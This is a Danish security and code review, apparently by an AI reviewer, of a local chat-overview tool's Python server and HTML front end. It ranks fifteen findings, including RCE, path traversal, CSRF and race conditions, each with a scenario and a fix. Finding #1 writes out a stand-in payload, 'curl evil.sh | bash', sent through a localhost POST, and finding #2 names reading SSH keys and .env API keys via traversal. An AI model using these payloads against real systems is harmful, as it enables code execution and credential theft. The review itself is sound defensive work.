# Ultra Review — Command Center

**Dato:** 2026-06-04
**Reviewer:** Claude Opus 4.7 (lokal max-effort review, fallback for cloud-ultrareview)
**Scope:** Hele kodebasen i `Chatoverblik/` — `chatoverblik.py` (2041 linjer) + `index.html` (2739 linjer)
**Metode:** 8 parallelle finder-agenter (correctness × 4, security, robustness, efficiency/altitude, reuse/simplify) → verifier mod kode → 15 alvorligst-rangerede fund

---

## Hvorfor dette review

Command Center er ved at blive Politikens fælles vibe-coding-værktøj for flere
kolleger. Når værktøjet udrulles til andre brugere ændrer trusselsbilledet sig
væsentligt — flere kritiske huller i koden er kun "lokal-only" så længe det er
Kristians personlige Mac. Når en kollega-side besøges i browseren, eller når
serveren lytter på Politikens WiFi, bliver flere af fundene reelle.

---

## Top-3 må fixes før udrulning

Findings #1–#4 er teknisk ét samlet kompromis: hvis CSRF-check (#4) tilføjes
korrekt, lukkes #1 også. #2 og #3 skal patches separat (en enkelt linje hver).

---

## Findings (severity-rangeret)

### 1. RCE: AppleScript-injektion i `/api/open-in-terminal`
**Fil:** `chatoverblik.py:2009`

`cmd` fra POST-body interpoleres direkte ind i en AppleScript `do script` der
køres via `osascript` — full arbitrary command execution fra enhver
localhost-origin.

**Failure scenario:** Kristian besøger en hvilken som helst webside mens
Command Center kører. Siden sender en simpel POST (Content-Type: text/plain
undgår CORS-preflight) til `http://localhost:7777/api/open-in-terminal` med
`{cwd:"/tmp", cmd:"curl evil.sh | bash"}`. `_is_external()` blokerer ikke
fordi browseren ER localhost. Terminal åbner og kører commanden som
brugeren — exfil af chathistorik, SSH-nøgler, Politiken VPN-creds.

**Note:** Ingen frontend-caller findes for dette endpoint — det er dead code.
Den sikreste fix er at fjerne endpointet helt.

---

### 2. Path traversal i `/api/file-content` via tom cwd
**Fil:** `chatoverblik.py:1230`

`valid_roots` bygges som set-comprehension over alle scannede sessioners cwd.
Hvis blot én session har tom cwd, indeholder settet `""` — og
`target_str.startswith("" + "/")` matcher enhver absolut sti.

**Failure scenario:** En Codex/Claude-chat uden detekteret cwd → set indeholder
`""`. CSRF-side eller anden localhost-bruger fetcher
`/api/file-content?path=/Users/kristian.jensen/.ssh/id_rsa` eller `.env` med
`ANTHROPIC_API_KEY` og får indholdet retur i JSON. Kun 500KB-cap som
begrænsning.

---

### 3. Samme tom-cwd path traversal i `/api/file-tree`
**Fil:** `chatoverblik.py:1205`

Identisk defekt — én tom cwd → enhver mappe på disken kan listes 4 niveauer
dybt.

**Failure scenario:** `GET /api/file-tree?cwd=/Users/kristian.jensen` lister
hele hjemmemappen og afslører struktur for senere file-content-kald.

---

### 4. Ingen CSRF-beskyttelse på POST-endpoints
**Fil:** `chatoverblik.py:1386`

`_is_external()` tjekker kun TCP-peer-IP (altid 127.0.0.1 for browser-kald).
Ingen Origin/Referer/CSRF-token. Simple POST med `text/plain` content-type
omgår CORS-preflight.

**Failure scenario:** Malicious side besøgt af kollega kalder `/api/delete`
(sletter chats), `/api/widgets` POST (overskriver `04_widgets.md`),
`/api/workflow-analysis` (dræner Anthropic-budget ~$2.50/Opus-call),
`/api/open-in-windsurf` (åbner editor mod kollegaens vilje) eller
`/api/open-in-terminal` (RCE, se #1).

**Fix:** Tilføj Origin-allowlist check (kun `http://localhost:7777` /
`http://127.0.0.1:7777`).

---

### 5. `/preview/*` eksponerer projektfiler på LAN uden autentificering
**Fil:** `chatoverblik.py:1099`

Server binder `0.0.0.0:7777`. Den base64-kodede cwd er den eneste 'token' og
projektstier er fuldt forudsigelige (synlige fra Git-commits, kolleger kender
navnene). `_PREVIEW_EXTS` tillader `.md/.json/.txt` — `STATUS.md`,
`HANDOVER.md`, wrangler-konfig, README med upublicerede URL'er og redaktionelle
noter lækker.

**Failure scenario:** Når flere journalister bruger værktøjet bliver dette
utilsigtet deling af hinandens upublicerede arbejde på Politikens WiFi.

**Fix:** Bind localhost for alle ruter, brug separat 0.0.0.0-listener kun for
`/preview/` ELLER kræv en engangs-token i preview-URL'en.

---

### 6. Hardkodede `/Users/kristian.jensen`-stier
**Fil:** `chatoverblik.py:1203` (og 4 andre steder)

Værktøjet er ubrugeligt for andre brugere uden at editere koden.

**Failure scenario:** Kollegaen Anne installerer Command Center på
`/Users/anne/Code/Masterversioner`. `/api/file-tree` afviser alle stier,
`/api/widgets` fejler på read, `/api/new-project` skriver mod en mappe Anne
ikke har skriverettigheder til.

**Fix:** Hent fra `Path.home()` / en `CONFIG_ROOT`-variabel.

---

### 7. `/api/project-handover` skriver `HANDOVER.md` til vilkårlig mappe
**Fil:** `chatoverblik.py:1596`

Kun check er `Path(cwd).is_dir()`.

**Failure scenario:** CSRF-side POSTer
`cwd=/Users/kristian.jensen/Documents/CODE/<vigtig-mappe>` → server overskriver
eksisterende `HANDOVER.md` med AI-genereret content. Plus drainer
Anthropic-budget per kald.

**Fix:** Valider ind i Masterversioner-roden (samme whitelist som file-tree).

---

### 8. NameError på `file_to_open` i VS Code-fallback
**Fil:** `chatoverblik.py:1455`

Variablen refereres men er aldrig defineret i scope.

**Failure scenario:** Bruger uden `code` CLI i PATH klikker 'Åbn i VS Code'.
`find_code_cli()` returnerer `None` → `if file_to_open:` → NameError → frontend
toast viser tekniske fejl. Den primære fallback (`open -a 'Visual Studio
Code'`) eksekveres aldrig.

**Fix:** Slet variablen — fallbacken har ikke brug for den.

---

### 9. AI-worker overskriver cache-entry og wiper user_title/pinned
**Fil:** `chatoverblik.py:565`

`cache[cache_key] = result` overskriver hele dict'en uden merge.

**Failure scenario:** Cold-start: background_load køer AI-titler for ~150
chats. Bruger pinner chat K eller omdøber den mens worker er mid-flight.
`/api/pin` gemmer `cache[K] = {'pinned': True}`. ~30s senere returnerer
AI-kaldet og overskriver dict'en med kun `{title, summary}`. Pin/rename
forsvinder ved næste app-restart.

**Fix:** `cache.setdefault(key, {}).update(result)`.

---

### 10. STATE muteres fra flere tråde uden lock
**Fil:** `chatoverblik.py:2034`

`ThreadingHTTPServer` + background_load + AI-worker-pool muterer alle
`STATE['sessions'/'cache'/'search_index']`.

**Failure scenario:** Bruger sletter chat A samtidig med at background_load
bygger search_index. `STATE['sessions'] = [...]` + worker thread itererer
samme liste → `RuntimeError: list changed size during iteration`. To samtidige
`/api/pin`-kald = race på cache.json, sidste skriver vinder.

**Fix:** `threading.RLock` omkring alle STATE-mutationer + save_cache.

---

### 11. 4s-polling overskriver bruger-handlinger
**Fil:** `index.html:2736`

`setInterval(loadSessions, 4000)` overskriver `state.sessions` med
polling-svar.

**Failure scenario:** Ved t=3.9s sendes en poll. Ved t=4.0s klikker bruger
'omdøb', POST starter. Ved t=4.05s ankommer pollen med GAMMEL titel (POSTen
er ikke nået til serveren endnu) og overskriver `state.sessions`. Den
optimistiske lokale ændring forsvinder fra UI'et indtil næste poll.

**Fix:** Pause polling mens en mutation er in-flight ELLER merge i stedet for
overskrive.

---

### 12. `_TAG_BLOCKS` "permissions instructions" matcher aldrig
**Fil:** `chatoverblik.py:116`

Det ægte format er `<permissions instructions="...">...</permissions>` — tag
*navn* 'permissions' med attribut. Det nuværende regex søger efter en tag der
HEDDER 'permissions instructions' med mellemrum i navnet, hvilket aldrig kan
matche.

**Failure scenario:** Permissions-blokke (ofte lange) lækker ind i
first_user-preview OG i prompts der sendes til Anthropic — koster tokens og
forurener AI-titler.

**Fix:** Skal være blot `"permissions"`.

---

### 13. Weekly-retro timezone string-compare
**Fil:** `chatoverblik.py:1722`

`cutoff` er `+00:00`-suffix, chat-timestamps er `Z`-suffix. Lexicografisk er
`Z` (0x5A) > `+` (0x2B).

**Failure scenario:** Chat ended kl. én time FØR cutoff inkluderes fejlagtigt
i 'sidste 7 dage'. Weekly retro bliver subtil og urigtig.

**Fix:** Parse begge til `datetime`-objekter og sammenlign dem.

---

### 14. `do_POST` læser Content-Length uden upper bound
**Fil:** `chatoverblik.py:1390`

**Failure scenario:** CSRF-page sender POST med Content-Length:
10_000_000_000. `rfile.read(10G)` allokerer 10GB i én bytes-buffer — proces
OOM'er eller swapper Macen til knæfald.

**Fix:** Cap til 5 MB.

---

### 15. `_serve_preview` strippes ikke for query-string
**Fil:** `chatoverblik.py:1104`

`self.path` parses rå — `?v=2` cache-busting → 404.

**Failure scenario:** Projektets `index.html` refererer `<script src="app.js?v=2">`.
Browser fetcher `/preview/<b64>/app.js?v=2`. `(base / 'app.js?v=2').resolve()`
matcher ingen fil → 404. Mobile preview bryder for alle projekter med
cache-busting.

**Fix:** `rest = urlparse(self.path).path[len('/preview/'):]`.

---

## Anbefalet rækkefølge

1. **De fire kritiske (1–4)** — én fix-PR. RCE + path-traversal + CSRF skal
   lukkes før værktøjet udrulles til kolleger.
2. **Multi-user readiness (5, 6, 7)** — anden fix-PR når deploy-modellen er
   afklaret (alle bruger samme repo? Eller hver sin clone?).
3. **Robusthed (8–11)** — kan vente til efter udrulning, men #8 (NameError)
   rammer enhver bruger uden `code` CLI installeret.
4. **Polish (12–15)** — lavprioritet, kan tages som batch når lyst byder.

## Outstanding fra reviewet (ikke blandt top 15)

- Reuse: Anthropic API-kald hardkodet 4 steder med inkonsistent model-allowlist
- Reuse: Modal-scaffolding kopieret 7+ gange i index.html
- Simplification: ~75 inline-styles der dublerer eksisterende CSS-klasser
- Efficiency: Polling kører i baggrunden uden visibilitychange-gating
- Altitude: cwd/original_cwd/cwd_hint/user_cwd er 4 overlappende felter
- Altitude: 0.0.0.0-bind bandaiaes med `_is_external()` på hver ny route

Disse er værd at tage som "tech-debt" sprint efter de kritiske fixes er ude.
